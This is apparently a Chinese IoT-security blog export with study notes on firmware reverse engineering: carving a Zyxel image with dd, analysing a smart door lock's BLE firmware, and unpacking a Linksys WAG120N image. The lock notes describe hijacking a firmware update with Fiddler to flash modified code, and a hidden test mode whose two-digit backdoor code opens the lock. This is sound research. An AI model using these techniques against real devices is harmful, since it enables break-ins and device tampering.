class="line">lxl@ubuntu:~/Desktop/tmp/15$ mkdir filesystem</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ sudo mount 2.bin ./filesystem</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ ls filesystem/</span><br><span class="line">bin  etc  lib  lost+found  sbin  tmp  tmp.tar.gz  usr  var</span><br></pre></td></tr></table></figure>
<h2 id="05-其他"><a href="#05-其他" class="headerlink" title="05-其他"></a>05-其他</h2><ul>
<li>binwalk也会产生误报</li>
<li>文件1、2中均得到了Linux文件系统，有什么区别？</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15/ram_disk$ ls</span><br><span class="line">bin  dev  e-data  etc  home  i-data  init  lib  linuxrc  mnt  proc  ram_bin  root  sbin  sys  tmp  usr  var  zyxel</span><br><span class="line"><span class="comment"># 2 </span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ ls filesystem/</span><br><span class="line">bin  etc  lib  lost+found  sbin  tmp  tmp.tar.gz  usr  var</span><br></pre></td></tr></table></figure>
<p>//here</p>
<p><a href="https://will03.github.io/posts/CVE-2020-9054-Analysis/#附錄" target="_blank" rel="noopener">https://will03.github.io/posts/CVE-2020-9054-Analysis/#附錄</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 共18组</span></span><br><span class="line">id          len               data</span><br><span class="line">00 00       04 00 00 00       31 2E 30 30 </span><br><span class="line">01 00       0D 00 00 00       56 35 2E 32 31 28 41 41 53 5A 2E 33 29 </span><br><span class="line">02 00       05 00 00 00       35 31 31 37 33 </span><br><span class="line">01 01       04 00 00 00       42 32 30 33 </span><br><span class="line">00 02       20 00 00 00       39 61 65 37 37 36 34 38 62 37 66 35 61 63 30 36 34 62 33 34 61 63 38 39 65 38 31 34 65 61 31 66 </span><br><span class="line">01 02       20 00 00 00       66 62 36 64 39 30 65 63 61 62 63 36 36 66 62 36 35 31 37 63 31 62 61 65 33 63 35 32 63 65 32 63 </span><br><span class="line">02 02       04 00 00 00       35 41 32 44 </span><br><span class="line">03 02       04 00 00 00       30 30 30 30 </span><br><span class="line">04 02       20 00 00 00       32 39 63 61 38 66 61 63 38 32 34 31 34 35 64 66 38 37 63 63 30 61 34 38 62 34 36 34 62 36 32 38 </span><br><span class="line">00 10       04 00 00 00       0E 01 00 00 </span><br><span class="line">01 10       04 00 00 00       B5 63 71 00 </span><br><span class="line">04 10       04 00 00 00       B6 63 71 00 </span><br><span class="line">05 10       04 00 00 00       AB CF 93 03 </span><br><span class="line">00 A0       04 00 00 00       AC CF 93 03 </span><br><span class="line">01 A0       04 00 00 00       16 D4 93 03 </span><br><span class="line">02 A0       04 00 00 00       17 D4 93 03 </span><br><span class="line">03 A0       04 00 00 00       CC D7 93 03 </span><br><span class="line">FF FF       none              CC D7 93 03<span class="comment"># 没有len，同上个data一致，应该是结束标记</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 整理如下</span></span><br><span class="line">id= 0000	  len= 4	  data= 1.00</span><br><span class="line">id= 0100	  len= 13  	data= V5.21(AASZ.3)</span><br><span class="line">id= 0200	  len= 5	  data= 51173</span><br><span class="line">id= 0101	  len= 4	  data= B203</span><br><span class="line">id= 0002	  len= 32  	data= 9ae77648b7f5ac064b34ac89e814ea1f</span><br><span class="line">id= 0102	  len= 32  	data= fb6d90ecabc66fb6517c1bae3c52ce2c</span><br><span class="line">id= 0202	  len= 4	  data= 5A2D</span><br><span class="line">id= 0302	  len= 4	  data= 0000</span><br><span class="line">id= 0402	  len= 32  	data= 29ca8fac824145df87cc0a48b464b628</span><br><span class="line">id= 0010	  len= 4	  data= 0x10e<span class="comment"># 文件1，大小=后-此+1，偏移=此+0x30</span></span><br><span class="line">id= 0110	  len= 4	  data= 0x7163B5</span><br><span class="line">id= 0410	  len= 4	  data= 0x7163B6 <span class="comment"># 文件2</span></span><br><span class="line">id= 0510	  len= 4	  data= 0x393CFAB   </span><br><span class="line">id= 00a0	  len= 4	  data= 0x393CFAC<span class="comment"># 文件3</span></span><br><span class="line">id= 01a0	  len= 4	  data= 0x393D416</span><br><span class="line">id= 02a0	  len= 4	  data= 0x393D417<span class="comment"># 文件4</span></span><br><span class="line">id= 03a0	  len= 4	  data= 0x393D7CC</span><br><span class="line">id= FFFF    len=无     data=0x393D7CC（没有len，同上个data一致，应该是结束标记</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 共4文件，3个hash</span></span><br><span class="line"><span class="comment"># 计算偏移时，要加上前面的0x30</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取4个文件（大小=后-此+1，偏移=此+0x30</span></span><br><span class="line"><span class="comment"># skip=318 = 0x10e + 0x30</span></span><br><span class="line"><span class="comment"># count=7430824 = 0x7163B5 - 0x10e + 1</span></span><br><span class="line">dd <span class="keyword">if</span>=521AASZ3C0.bin of=f1.bin skip=318 bs=1 count=7430824</span><br><span class="line">dd <span class="keyword">if</span>=521AASZ3C0.bin of=f2.bin skip=7431142 bs=1 count=7431095</span><br><span class="line">dd <span class="keyword">if</span>=521AASZ3C0.bin of=f3.bin skip=60018652 bs=1 count=1131</span><br><span class="line">dd <span class="keyword">if</span>=521AASZ3C0.bin of=f4.bin skip=60019783 bs=1 count=950</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只有f1即uimage能与3个hash匹配上</span></span><br><span class="line"><span class="comment"># 3个hash也不是完全匹配上的，这个匹配上1个，文中匹配上2个</span></span><br><span class="line"><span class="comment"># 同文中的固件不同，但f3和f4的hash却与文中一致，这应该是不变的东西</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ md5sum f*</span><br><span class="line">9ae77648b7f5ac064b34ac89e814ea1f  f1.bin</span><br><span class="line">2754f09320c8e97a11ed2eca66e85f55  f2.bin</span><br><span class="line">df27a44b76a9fe182834c785f1713054  f3.bin</span><br><span class="line">66450075a442dadba541ab9dab57f7fd  f4.bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># f1、f2较大，有用数据在f1、f2中</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ ll f*</span><br><span class="line">-rw-r--r-- 1 lxl lxl 7430824 Jan 25 16:05 f1.bin</span><br><span class="line">-rw-r--r-- 1 lxl lxl 7431095 Jan 25 16:06 f2.bin</span><br><span class="line">-rw-r--r-- 1 lxl lxl    1131 Jan 25 16:06 f3.bin</span><br><span class="line">-rw-r--r-- 1 lxl lxl     950 Jan 25 16:06 f4.bin</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ file f*</span><br><span class="line">f1.bin: u-boot legacy uImage, Linux-3.2.54, Linux/ARM, OS Kernel Image (Not compressed), 7430760 bytes, Fri Feb 21 02:36:45 2020, Load Address: 0x0F008000, Entry Point: 0x0F008000, Header CRC: 0x0CCCB906, Data CRC: 0xBA861EEC</span><br><span class="line">f2.bin: gzip compressed data, last modified: Fri Feb 21 06:43:55 2020, max compression, from Unix</span><br><span class="line">f3.bin: POSIX shell script, ASCII text executable</span><br><span class="line">f4.bin: POSIX shell script, ASCII text executable</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接binwalk -Me即可，f3/4并未得到</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 综上，f1/2文件大，有用数据一般在此，f3/4较小，但不同固件中，hash却一致，应该是某种固定的数据</span></span><br><span class="line"></span><br><span class="line">找相应固件//here</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="https://www.pentestpartners.com/security-blog/using-hexdump-analysis-for-firmware-extraction-a-how-to/" target="_blank" rel="noopener">https://www.pentestpartners.com/security-blog/using-hexdump-analysis-for-firmware-extraction-a-how-to/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
        <tag>固件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>果加智能门锁的安全分析</title>
    <url>/2021/05/23/iot/%E6%9E%9C%E5%8A%A0%E6%99%BA%E8%83%BD%E9%97%A8%E9%94%81%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="果加智能门锁的安全分析"><a href="#果加智能门锁的安全分析" class="headerlink" title="果加智能门锁的安全分析"></a>果加智能门锁的安全分析</h1><h2 id="上"><a href="#上" class="headerlink" title="上"></a>上</h2><ul>
<li>概要：抓包获取固件、MCU手册、固件解析（指令集、加载基址、解析位置）</li>
<li>设备-中转-云端的通信方式<ul>
<li>设备-BLE协议-手机app-云端（手机无线通信，无需交换机）</li>
<li>设备-433MHz无线-设备网关-交换机-云端（设备网关一般是有线，故有交换机）</li>
<li>留意其它方式</li>
</ul>
</li>
<li>固件<ul>
<li>传统意义：驱动硬件的软件程序</li>
<li>IoT设备中：包含了RTOS(实时操作系统)和应用软件，提供了从底层驱动（操作系统）到高层应用（应用软件）的所有功能</li>
<li>固件一般要包含一个RTOS，设备上电后就会启动RTOS（比如Linux系统就启动kernel内核）</li>
<li>目前遇到两种情况：Linux系统则Linux kernel+文件系统中程序、Vxwork等系统则一个单一可执行文件</li>
</ul>
</li>
<li>固件获取<ul>
<li>手机中转：设备-手机app-云端，设备更新一定会访问云端，而手机app作为中转，故fiddler抓包手机</li>
<li>网关中转：设备-网关-交换机-云端，对交换机做端口监控（步骤未知//here）</li>
</ul>
</li>
<li>fiddler抓包手机<ul>
<li>fiddler设置两处：解密https通信（固件更新可能会https）、允许其它设备连接代理（而非只有运行fiddler的pc）</li>
<li>手机设置两处：设置根证书（解密https用）、将fiddler作为代理转发数据（即设备-手机-fiddler-云端）</li>
</ul>
</li>
<li>逆向对象<ul>
<li>Linux：包含Linux文件系统，文件系统中的各个程序将是分析重点</li>
<li>FreeRTOS/Vxworks：固件是一段编译好的包含代码和数据的可执行文件，单一的单片机程序</li>
</ul>
</li>
<li>自动/人工识别<ul>
<li>若是Linux文件系统中的程序，可自动识别：ELF等格式、处理器型号</li>
<li>若固件是单一的可执行程序：与设备硬件相关，不同MCU会使用不同的指令集、文件系统等，需人工识别</li>
</ul>
</li>
<li>binwalk<ul>
<li>情况1：识别出U-Boot引导程序、Squashfs文件系统、lzma等压缩数据、其它（最普遍的情况，直接-Me提取）</li>
<li>情况2：无法辨别固件，即没有任何输出，固件可能：可执行文件（需直接逆向固件）、加密过的（先解密再提取）</li>
</ul>
</li>
<li>指令集<ul>
<li>型号：根据MCU上刻印的芯片型号-STM32L071，找到对应的手册</li>
<li>datasheet：目录introductory，使用了Arm Cortex-M0+内核</li>
<li><a href="http://www.arm.com" target="_blank" rel="noopener">www.arm.com</a> ：查询该内核采用Armv6-M架构，即Armv6-M指令集</li>
<li>设置IDA：processor options、edit arm architecture option、选择Armv6-M</li>
</ul>
</li>
<li>加载基址<ul>
<li>固件程序没有重定位表等结构，若加载地址错误，就会出现不能解析的跳转和全局变量</li>
<li><strong><em>通常MCU都会有一块固定的存储区域用于存储代码，这个区域的起始地址就是固件的加载地址</em></strong></li>
<li>References Manual：目录Memory organization，找内存映射图，固件位于CODE的Flash System Memory区域</li>
<li>设置IDA：ROM start address、Loading address</li>
</ul>
</li>
<li>解析位置<ul>
<li>指定指令集、加载地址还不够，还需指定解析位置</li>
<li>programming manual：目录vector table，找中断向量表：位置（固件起始）、结构（第二项是reset）</li>
<li>设备上电之后执行的代码，即Reset复位中断（reset事件对应reset函数）</li>
<li>reset位于第二项即偏移0x4，跳转到此，按’c’将此处解析为代码</li>
</ul>
</li>
<li>手册<ul>
<li>Datasheet即产品规格：目录memory mapping，找内存映射图（提示到reference manual ）、目录introductory，找采取的内核</li>
<li>References Manual即参考手册：目录Memory organization，找内存映射图</li>
<li>Programming Mannual即编程手册：目录vector table，找中断向量表的位置及结构</li>
</ul>
</li>
<li>芯片-内核-架构-指令集<ul>
<li>芯片采用Arm Cortex-M0+内核</li>
<li>Arm Cortex-M0+内核采用Armv6-M架构</li>
<li>Armv6-M架构即对应Armv6-M指令集</li>
</ul>
</li>
</ul>
<h2 id="中"><a href="#中" class="headerlink" title="中"></a>中</h2><ul>
<li>概要：通过app中常量定位固件中代码、门锁固件分析</li>
<li><p>固件分析</p>
<ul>
<li>分析难度大：代码多、没有调试信息、没有可参考的字符串</li>
<li>以BLE通信为突破口，找到关键代码</li>
<li>法1：通过BLE通信的帧格式：在代码中定位格式中常量，通过常量找到BLE通信数据的解析函数</li>
<li>法2：通过硬件电路：找到MCU与BLE芯片的通信引脚，查看文档确定该引脚映射的内存地址，找到BLE发送/接收函数</li>
</ul>
</li>
<li><p>app分析：获取常量</p>
<ul>
<li>思路：门锁与app进行通信，先分析app找到常量，再利用常量去固件中定位</li>
<li>java层：通过日志字符串，定位到libBleCmd.so库文件</li>
<li>Native层：zip解压apk获取so文件、导出函数中发现Tea算法相关的加/解密函数、Tea算法会用到常量、找到2个常量0xCE6D-0x58BF</li>
</ul>
</li>
<li><p>固件分析：通过常量定位</p>
<ul>
<li>设置架构为Armv6-M，有些指令无法反汇编，改用Armv7-M后成功，原因未知。</li>
<li>alt + t搜索常量，再对比libBleCmd.so-Decrypt，确定固件中Encrypt/Decrypt函数</li>
</ul>
</li>
<li><p>sub_800B528调用Decrypt</p>
<ul>
<li>0xBABEC0DE常量：app日志中，0xBABEC0DE为BLE消息开头</li>
<li>Decrypt的3参数：密文、长度、解密密钥</li>
<li>解密密钥：动态生成的，放于变量中（内存中），进一步找到密钥生成代码</li>
<li>小结：ble消息预处理，即消息头检验、crc校验、是否可解密</li>
</ul>
</li>
<li>代码进一步分析<ul>
<li>sub_800EB20调用sub_800B528：根据其返回值设置内存（即变量赋值）、密文及长度的内存</li>
<li>sub_80000C8调用sub_800EB20：见下篇</li>
</ul>
</li>
<li>小结：<ul>
<li>app分析：日志分析、先定位到java再native、so中找到加解密函数、tea算法中常量</li>
<li>门锁固件分析：常量定位到加解密函数、分析出密文-长度-密钥的内存、不断交叉引用加强程序理解</li>
</ul>
</li>
<li>其它<ul>
<li>Armv6-M是Armv7-M的子集，v6程序可直接移植到v7-M架构上</li>
<li>反编译工具，JEB相比于Jadx，更方便</li>
<li>java/native层：Java程序中，可以使用由其他编程语言实现的函数，即原生（Native）函数</li>
</ul>
</li>
</ul>
<h2 id="下"><a href="#下" class="headerlink" title="下"></a>下</h2><ul>
<li><p>概要：固件代码分析、重刷固件、语音提示函数、测试模式、后门密码</p>
</li>
<li><p>sub_80000C8即main</p>
<ul>
<li>最复杂的函数，梳理代码框架，是个while死循环，只有入口没有出口</li>
<li>系统复位中断之后执行的第二个函数</li>
<li>综上：最复杂+死循环+第二个 = main</li>
</ul>
</li>
</ul>
<ul>
<li><p>相关概念</p>
<ul>
<li>复位中断会执行两个函数：init、main</li>
<li>单片机：main一般是死循环，不可执行完毕后退出。上电之后，MCU就开始运行程序，直到断电</li>
<li>运行于操作系统之上的程序：如ls，完成功能后就退出</li>
</ul>
</li>
<li><p>main</p>
<ul>
<li>一般流程（个人经验）：消息预处理、BLE指令解析、完成逻辑功能</li>
<li>调用sub_800EB20：返回0表预处理成功，即消息头校验、crc校验、数据解密</li>
<li>两个标志位：1-是否收到ble指令</li>
<li>调用sub_800F9EC：switch-case语句处理各种ble指令、结合日志推断变量含义</li>
</ul>
</li>
<li><p>case 0xE004</p>
<ul>
<li>ble指令类型：开锁，即门锁如何处理开锁指令</li>
<li>sub_80125C8：日期转时间戳，不在区间时调用sub_800D40C（暂未知功能），即密码过期不可开锁</li>
</ul>
</li>
<li><p>sub_800D40C语音提示函数</p>
<ul>
<li>调用位置很多、参数为常量、main进入while前调用</li>
<li>反复修改并刷入固件（main-while那个），发现提示音不同</li>
<li>小结：语音提示函数、参数即语音内容、类似日志输出可帮助理解代码、整理出语音表</li>
</ul>
</li>
<li><p>固件重刷</p>
<ul>
<li>修改：16进制编辑器</li>
<li>刷入：固件更新时作劫持，Fiddler-AutoResponder，新固件替换原固件</li>
</ul>
</li>
<li><p>语音“进入测试模式”</p>
<ul>
<li>如何触发语音，即如何进入测试模式？</li>
<li>判断某函数返回值，其参数为字符串（即门锁键盘可输入的值），应该类似strcmp</li>
<li>输入此字符串，门锁果然提示说“进入测试模式”</li>
</ul>
</li>
<li><p>后门密码：测试模式下，2个数字加#号，可开锁</p>
</li>
</ul>
<blockquote>
<p>参考：</p>
<ul>
<li><a href="https://www.4hou.com/posts/53nR" target="_blank" rel="noopener">https://www.4hou.com/posts/53nR</a></li>
<li><a href="https://www.4hou.com/posts/62o9" target="_blank" rel="noopener">https://www.4hou.com/posts/62o9</a></li>
<li><a href="https://www.4hou.com/posts/7O8A" target="_blank" rel="noopener">https://www.4hou.com/posts/7O8A</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>智能门锁</tag>
      </tags>
  </entry>
  <entry>
    <title>Linksys-WAG120N固件分析</title>
    <url>/2021/05/22/iot/Linksys-WAG120N%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="Linksys-WAG120N固件分析"><a href="#Linksys-WAG120N固件分析" class="headerlink" title="Linksys-WAG120N固件分析"></a>Linksys-WAG120N固件分析</h1><ul>
<li><p>固件：<a href="https://www.linksys.com/gb/support-article?articleNum=208638中的https://downloads.linksys.com/downloads/firmware/WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin" target="_blank" rel="noopener">https://www.linksys.com/gb/support-article?articleNum=208638中的https://downloads.linksys.com/downloads/firmware/WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin</a></p>
</li>
<li><p>首先file，确保不是打包或压缩文件</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/tmp$ file WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin </span><br><span class="line">WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin: data</span><br><span class="line"><span class="comment"># data数据，未识别出其他，故继续</span></span><br></pre></td></tr></table></figure>
<h2 id="01-找敏感信息-uboot-kernel"><a href="#01-找敏感信息-uboot-kernel" class="headerlink" title="01-找敏感信息-uboot/kernel"></a>01-找敏感信息-uboot/kernel</h2><ul>
<li>hexdump、strings找敏感字符串</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只保留了有用的</span></span><br><span class="line"><span class="comment"># 出现u-boot和Linux内核信息，说明此固件确实运行在Linux上</span></span><br><span class="line"><span class="comment"># U-Boot是一个非常普遍的boot loader</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ strings -n 10 WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin</span><br><span class="line">U-Boot 1.1.5-2.0 (Jul 22 2009 - 14:05:28) <span class="comment"># U-Boot boot loader</span></span><br><span class="line">Can not <span class="built_in">read</span> from <span class="built_in">source</span> buffer</span><br><span class="line">Not enough buffer <span class="keyword">for</span> decompression</span><br><span class="line">u-boot image</span><br><span class="line">entry download..</span><br><span class="line">%02x:%02x:%02x:%02x:%02x:%02x</span><br><span class="line">getPIDfromFlash</span><br><span class="line"><span class="built_in">read</span> ok..!!</span><br><span class="line">erase all,keep data from 0x%x to 0x%x</span><br><span class="line">normal erase</span><br><span class="line">erase complete</span><br><span class="line">enter download.</span><br><span class="line">Download mode ...</span><br><span class="line">GET_VERSION_INFO!</span><br><span class="line">f_kernel_crc</span><br><span class="line">f_rootfs_crc</span><br><span class="line">f_firmware_crc</span><br><span class="line">f_rootfs_addr</span><br><span class="line">download: verify..</span><br><span class="line">MIPS Linux-2.4.31-Amazon_SE-3.6.]<span class="comment"># Linux kernel</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 并未发现有用的东西</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ hexdump -C WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin | less</span><br></pre></td></tr></table></figure>
<ul>
<li>binwalk</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 有两个uImage header（是u-boot所使用的头格式），后面都紧跟了LZMA压缩的数据</span></span><br><span class="line"><span class="comment"># 2 识别出了信息，如compression type、image name（type为lzma，与1对应</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">9660          0x25BC          U-Boot version string, <span class="string">"U-Boot 1.1.5-2.0 (Jul 22 2009 - 14:05:28)"</span></span><br><span class="line">9708          0x25EC          CRC32 polynomial table, big endian</span><br><span class="line"><span class="comment"># 第一个uImage header</span></span><br><span class="line">11012         0x2B04          uImage header, header size: 64 bytes, header CRC: 0xF5170888, created: 2009-07-22 06:05:29, image size: 47540 bytes, Data Address: 0x80400000, Entry Point: 0x80400000, data CRC: 0x84EF8694, OS: Linux, CPU: MIPS, image <span class="built_in">type</span>: Firmware Image, compression <span class="built_in">type</span>: lzma, image name: <span class="string">"u-boot image"</span></span><br><span class="line"><span class="comment"># 跟了LZMA，偏移11076</span></span><br><span class="line">11076         0x2B44          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 147212 bytes</span><br><span class="line">65434         0xFF9A          Sercomm firmware signature, version control: 1, download control: 256, hardware ID: <span class="string">"YQZ"</span>, hardware version: 0x0, firmware version: 0x6, starting code segment: 0x100, code size: 0x7300</span><br><span class="line">65497         0xFFD9          Sercomm firmware signature, version control: 0, download control: 0, hardware ID: <span class="string">""</span>, hardware version: 0x0, firmware version: 0x2700, starting code segment: 0x1A9C, code size: 0x3D0</span><br><span class="line">72028         0x1195C         Sercomm firmware signature, version control: 29184, download control: 24933, hardware ID: <span class="string">"d ok..!!"</span>, hardware version: 0x7266, firmware version: 0x2578, starting code segment: 0xA78, code size: 0x0</span><br><span class="line"><span class="comment"># 第二个uImage header</span></span><br><span class="line">196608        0x30000         uImage header, header size: 64 bytes, header CRC: 0x754608A, created: 2010-08-06 08:08:48, image size: 577064 bytes, Data Address: 0x80002000, Entry Point: 0x801B2040, data CRC: 0xE3AB62DD, OS: Linux, CPU: MIPS, image <span class="built_in">type</span>: OS Kernel Image, compression <span class="built_in">type</span>: lzma, image name: <span class="string">"MIPS Linux-2.4.31-Amazon_SE-3.6.]"</span></span><br><span class="line"><span class="comment"># 跟了LZMA，偏移196672</span></span><br><span class="line">196672        0x30040         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 1986560 bytes</span><br><span class="line">851968        0xD0000         Squashfs filesystem, big endian, lzma compression, version 2.1, size: 2916178 bytes, 714 inodes, blocksize: 65536 bytes, created: 2010-08-06 08:11:16</span><br></pre></td></tr></table></figure>
<h2 id="02-提取u-boot及kernel"><a href="#02-提取u-boot及kernel" class="headerlink" title="02-提取u-boot及kernel"></a>02-提取u-boot及kernel</h2><ul>
<li>dd提取并lzma解压缩</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># lzma解压只认后缀为.lzma</span></span><br><span class="line"><span class="comment"># dd时不必担心要指定大小（即count参数），在lzma解压会忽略掉尾部垃圾数据（但linxu下实测失败</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin of=uboot.lzma bs=1 skip=11076</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin of=kernel.lzma bs=1 skip=196672</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ ls</span><br><span class="line">kernel.lzma  uboot.lzma  WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># lzma -d 等同于 unlzma</span></span><br><span class="line"><span class="comment"># linxu下实测失败</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ lzma -d uboot.lzma </span><br><span class="line">lzma: uboot.lzma: Compressed data is corrupt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 精确控制count（根据binwalk结果，lzma偏移是11076，紧挨着为65434</span></span><br><span class="line"><span class="comment"># expr进行数学运算，减号两边要空格</span></span><br><span class="line"><span class="comment"># 还是失败，看来不是垃圾数据的原因</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin of=uboot2.lzma bs=1 skip=11076 count=`expr 65434 - 11076`</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ lzma -d uboot2.lzma </span><br><span class="line">lzma: uboot2.lzma: Compressed data is corrupt</span><br><span class="line"></span><br><span class="line"><span class="comment"># mac及win下的7zip都可成功，故是lzma的问题</span></span><br><span class="line"><span class="comment"># 可见，不管lzma多大，最终解压出来都是144K，是不管垃圾数据的</span></span><br><span class="line">-rw-r--r--@  1 lxl  staff   144K  1  7 09:56 uboot</span><br><span class="line">-rw-r--r--@  1 lxl  staff   4.0M  1  6 17:20 uboot.lzma</span><br><span class="line">-rw-r--r--@  1 lxl  staff   144K  1  7 09:56 uboot2</span><br><span class="line">-rw-r--r--@  1 lxl  staff    53K  1  7 09:50 uboot2.lzma</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux下p7zip也失败</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ p7zip -d uboot.lzma </span><br><span class="line">/usr/bin/p7zip: uboot.lzma: unknown suffix</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ p7zip -d uboot2.lzma </span><br><span class="line">/usr/bin/p7zip: uboot2.lzma: unknown suffix</span><br><span class="line"></span><br><span class="line"><span class="comment"># 小结：lzma解压时确实会忽略尾部的垃圾数据（因为一般都是凭头部信息）、Linux下的lzma和p7zip都靠不住</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终得到解压缩后的uboot和kernel</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ ls</span><br><span class="line">kernel  uboot  WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin</span><br></pre></td></tr></table></figure>
<ul>
<li>strings，确保二者确实是U-Boot和Linux kernel镜像</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 确实是（缺少经验没看出来，就将此作为二者特征，以后就知道了）</span></span><br><span class="line"><span class="comment"># head 只看前20行</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ strings -n 20 uboot | head -20</span><br><span class="line">U-Boot 1.1.5-2.0 (Jul 22 2009 - 14:05:20)</span><br><span class="line"> relocate_code start</span><br><span class="line">detect reset button.</span><br><span class="line"> relocate_code finish.</span><br><span class="line">amazon_se_spi_init success!!</span><br><span class="line"><span class="comment">## Warning: gatewayip needed but not set</span></span><br><span class="line">ARP Retry count exceeded; starting again</span><br><span class="line">Bytes transferred = %ld (%lx hex)</span><br><span class="line"> ICMP Host Redirect to </span><br><span class="line">*** ERROR: `serverip<span class="string">' not set</span></span><br><span class="line"><span class="string">*** ERROR: `ipaddr'</span> not <span class="built_in">set</span></span><br><span class="line">*** ERROR: No ethernet found.</span><br><span class="line">*** ERROR: `ethaddr<span class="string">' not set</span></span><br><span class="line"><span class="string">*** ERROR: `eth%daddr'</span> not <span class="built_in">set</span></span><br><span class="line">TFTP error: First block is not block 1 (%ld)</span><br><span class="line">TFTP error: <span class="string">'%s'</span> (%d)</span><br><span class="line">Retry count exceeded; starting again</span><br><span class="line">%02lX%02lX%02lX%02lX.img</span><br><span class="line">*** Warning: no boot file name; using <span class="string">'%s'</span></span><br><span class="line">; our IP address is </span><br><span class="line"></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ strings -n 20 kernel | head -20</span><br><span class="line">Calibrating delay loop... </span><br><span class="line">Warning! BogoMIPS value are not stable!</span><br><span class="line">Kernel <span class="built_in">command</span> line: %s</span><br><span class="line">POSIX conformance testing by UNIFIX</span><br><span class="line">Warning: unable to open an initial console.</span><br><span class="line">No init found.  Try passing init= option to kernel.</span><br><span class="line">Linux version 2.4.31-Amazon_SE-3.6.10.4.patch.3-R0416V36_BSP_SPI_FLASH_A4 (root@localhost) (gcc version 3.3.6) <span class="comment">#2 Fri Aug 6 16:08:38 CST 2010</span></span><br><span class="line">VFS: Cannot open root device <span class="string">"%s"</span> or %s</span><br><span class="line">Please append a correct <span class="string">"root="</span> boot option</span><br><span class="line">VFS: Unable to mount root fs on %s</span><br><span class="line">VFS: Mounted root (%s filesystem)%s.</span><br><span class="line">%s/host%d/bus%d/target%d/lun%d</span><br><span class="line">%s/host%d/bus%d/target%d/lun%d/part%s</span><br><span class="line">%s/host%d/bus%d/target%d/lun%d/disc</span><br><span class="line">%s: unaligned epc - sending SIGBUS.</span><br><span class="line">Checking <span class="keyword">for</span> <span class="string">'wait'</span> instruction... </span><br><span class="line">2`&lt;6&gt;Unexpected CPU of NEC VR4100 series</span><br><span class="line">CPU revision is: %08x</span><br><span class="line">FPU revision is: %08x</span><br><span class="line">unexpected interrupt %d</span><br></pre></td></tr></table></figure>
<h2 id="03-发现filesystem"><a href="#03-发现filesystem" class="headerlink" title="03-发现filesystem"></a>03-发现filesystem</h2><ul>
<li>有了U-boot和Kernel镜像，下一步就需要发现提取出文件系统（尽管目前版本的binwalk足矣，还是手动搞一下</li>
<li>strings看kernel，是否有文件系统的信息</li>
</ul>
